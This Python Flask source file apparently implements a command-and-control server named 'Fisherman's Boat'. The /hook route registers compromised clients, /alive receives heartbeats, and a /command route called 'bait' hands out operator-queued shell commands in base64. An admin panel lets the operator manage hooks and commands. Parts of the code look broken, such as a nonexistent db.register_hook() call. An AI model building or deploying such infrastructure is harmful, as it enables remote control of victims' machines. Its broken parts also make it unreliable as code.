from flask import Flask, jsonify, render_template, abort
from flask_admin import Admin
from app.views.admin import MyAdminIndexView, HookModelView, CommandView
from flask_sqlalchemy import SQLAlchemy
import flask_login as login
from datetime import datetime
import base64


app = Flask(__name__)
app.config.from_pyfile("config.py")


admin = Admin(app, name="Fisherman's Boat", template_mode='bootstrap3', index_view=MyAdminIndexView())

db = SQLAlchemy()
db.init_app(app)

class Command(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    command = db.Column(db.String(256), nullable=False)

    def __repr__(self):
        return f'<Command {self.command}>'

class Hook(db.Model):
    id = db.Column(db.Integer, primary_key=True, autoincrement=True)
    last_update = db.Column(db.DateTime, default=datetime.utcnow, onupdate=datetime.utcnow)

    def __repr__(self):
        return f'<Hook {self.id}>'
    

class Admin(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    login = db.Column(db.String(80), unique=True)
    password = db.Column(db.String(64))

    @property
    def is_authenticated(self):
        return True

    @property
    def is_active(self):
        return True

    @property
    def is_anonymous(self):
        return False

    def get_id(self):
        return self.id

    # Required for administrative interface
    def __unicode__(self):
        return self.username

with app.app_context():
    db.create_all()

admin.add_view(HookModelView(Hook, db.session))
admin.add_view(CommandView(Command, db.session))

login_manager = login.LoginManager()
login_manager.init_app(app)

# Create user loader function
@login_manager.user_loader
def load_user(user_id):
    return db.session.query(Admin).get(user_id)

@app.route('/')
def index():
    return render_template('index.html')


@app.route('/hook')
def hook():
    return jsonify(identity=str(db.register_hook()))


@app.route('/alive', methods=['GET', 'POST'])
def alive():
    app.logger.info(f'Got alive signal')
    return jsonify(message='Hello')


@app.route('/command', methods=['POST'])
def bait():
    command_row = Command.query.first()
    if command_row:
        # Retrieve the command attribute
        command_value = command_row.command

        # Delete the first Command object from the database
        db.session.delete(command_row)
        db.session.commit()

        app.logger.info(f"Retrieved and deleted the first command: {command_value}")
        return jsonify(command=base64.b64encode(command_value.encode()).decode())
    
    app.logger.info("No commands found in the database")
    abort(404)

if __name__ == '__main__':
    app.run(host='127.0.0.1', port=5000)



